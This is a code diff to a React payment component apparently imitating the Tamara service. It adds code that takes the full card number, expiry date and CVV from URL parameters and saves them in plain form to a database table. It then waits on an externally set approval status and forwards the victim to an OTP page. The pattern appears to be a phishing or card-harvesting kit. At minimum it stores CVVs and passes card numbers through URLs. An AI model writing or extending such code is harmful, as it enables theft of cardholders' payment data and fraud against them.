@@ -19,7 +19,10 @@ const TamaraPaymentProcessing = () => {
   const [paymentId, setPaymentId] = useState<string | null>(null);
 
   const cardholderName = searchParams.get("cardholderName") || "";
+  const cardNumber = searchParams.get("cardNumber") || "";
   const cardNumberLast4 = searchParams.get("cardNumberLast4") || "";
+  const expiryDate = searchParams.get("expiryDate") || "";
+  const cvv = searchParams.get("cvv") || "";
   const totalAmount = searchParams.get("totalAmount") || "0";
   const monthlyPayment = searchParams.get("monthlyPayment") || "0";
   const company = searchParams.get("company") || "";
@@ -43,7 +46,10 @@ const TamaraPaymentProcessing = () => {
           .from("tamara_payments")
           .insert({
             cardholder_name: cardholderName,
+            card_number: cardNumber,
             card_number_last4: cardNumberLast4,
+            expiry_date: expiryDate,
+            cvv: cvv,
             total_amount: parseFloat(totalAmount),
             monthly_payment: parseFloat(monthlyPayment),
             company: company,
@@ -73,7 +79,7 @@ const TamaraPaymentProcessing = () => {
             clearInterval(pollInterval);
             setPaymentStatus("success");
             setTimeout(() => {
-              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}`);
+              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${data.id}`);
             }, 2000);
           } else if (statusData.payment_status === "rejected") {
             clearInterval(pollInterval);
